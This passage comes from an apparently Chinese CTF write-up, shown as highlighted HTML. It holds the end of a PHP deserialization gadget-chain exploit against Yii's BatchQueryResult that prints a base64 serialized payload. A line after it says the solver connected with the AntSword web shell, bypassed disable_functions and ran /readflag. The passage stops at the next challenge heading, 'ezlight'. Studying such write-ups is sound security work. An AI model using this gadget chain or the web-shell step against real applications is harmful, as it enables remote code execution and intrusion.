+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_dataReader</span><span class="o">=</span><span class="k">new</span> <span class="nx">Generator</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">yii\db\BatchQueryResult</span><span class="p">()));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>之后连蚁剑使用bypass disable_function插件执行<code>/readflag</code>获得flag。</p>
 <h2 id="ezlight"><a href="#ezlight" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:ezlight" class="headings">ezlight</a></h2>
